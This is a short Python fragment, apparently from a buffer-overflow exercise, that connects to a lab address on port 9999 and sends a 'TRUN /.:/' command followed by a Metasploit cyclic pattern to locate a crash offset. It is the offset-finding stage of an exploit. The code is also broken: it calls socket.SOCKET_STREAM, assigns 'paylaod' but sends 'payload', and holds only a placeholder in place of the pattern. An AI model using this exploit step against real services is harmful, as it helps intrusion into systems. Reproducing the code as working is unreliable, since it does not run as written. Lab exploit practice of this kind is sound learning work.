#!/usr/bin/python3
import sys, socket
from time import sleep

offset = "random string generated from /usr/share/metasploit-framework/tools/exploit/pattern_create.rb"

try:
    s=socket.socket(socket.AF_INET,socket.SOCKET_STREAM)
    s.connect(('192.168.34.165',9999))
    
    paylaod = "TRUN /.:/" + offset
    
    s.send((payload.encode()))
    s.close()
except:
    print("Error connecting to server")
    sys.exit()
        
